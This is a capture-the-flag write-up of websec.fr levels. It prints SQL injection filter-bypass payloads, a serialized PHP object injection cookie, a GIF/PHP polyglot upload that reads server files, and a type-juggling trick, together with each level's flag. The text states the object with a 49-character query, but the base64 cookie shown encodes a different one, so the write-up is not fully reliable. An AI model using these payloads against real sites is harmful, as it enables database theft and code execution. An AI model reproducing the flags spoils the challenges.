## websec.fr solutions
### level01

Payload

```
1/**/union/**/select/**/null,password/**/from/**/users/**/limit/**/2,1;--
Other User Details:
```

Response

```
WEBSEC{Simple_SQLite_Injection}
```

### level02

Payload

```
1/**/uniunionon/**/selselectect/**/null,password/**/frfromom/**/users;--
```

Response

```
WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
```

### level04

There is a PHP object injection vulnerability in the `leet_hax0r` cookie.

We first create a malicious serialized object: `O:3:"SQL":1:{s:5:"query";s:49:"SELECT password as username FROM users WHERE id=1";}`

Then we base64 encode it and set it as the cookie: `TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCBwYXNzd29yZCBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30=`

After refreshing the page, we get the flag: `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`


### level08

```php
GIF89a1 <?php echo file_get_contents("flag.txt"); ?>
```

Flag: `WEBSEC{BypassingImageChecksToRCE}`

### level17

Change `flag=` in POST request to `flag[]=`

Flag: `WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}`

### level25

`TBD`

Source

```
<?php

parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);

foreach ($query as $k => $v)
    if (stripos($v, 'flag') !== false)
        die('You are not allowed to get the flag, sorry :/');

include $_GET['page'] . '.txt';

?>
```

- Php wrappers won't work since we are required to put "flag" in the value for the parameter.
- Tried [this](https://security.stackexchange.com/questions/17407/how-can-i-use-this-path-bypass-exploit-local-file-inclusion) attack but got `414 Request-URI Too Large`.
